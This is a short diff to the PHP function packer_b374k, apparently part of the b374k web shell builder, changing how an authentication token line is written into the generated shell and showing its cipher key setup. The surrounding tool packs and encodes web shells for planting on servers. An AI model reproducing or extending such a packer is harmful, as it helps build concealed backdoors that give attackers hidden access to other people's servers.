@@ -607,7 +607,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		if(!is_writable($output)) return array("error : file ".$output." exists and is not writable{[|a374k|]}", null, null);
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".cryptMyMd5($password, $salt)."\"; // X-Csrf-Token\n";
+	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".cryptMyMd5($password, $salt)."\";\n";
 	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";
 
 	$compress_level = (int) $compress_level;
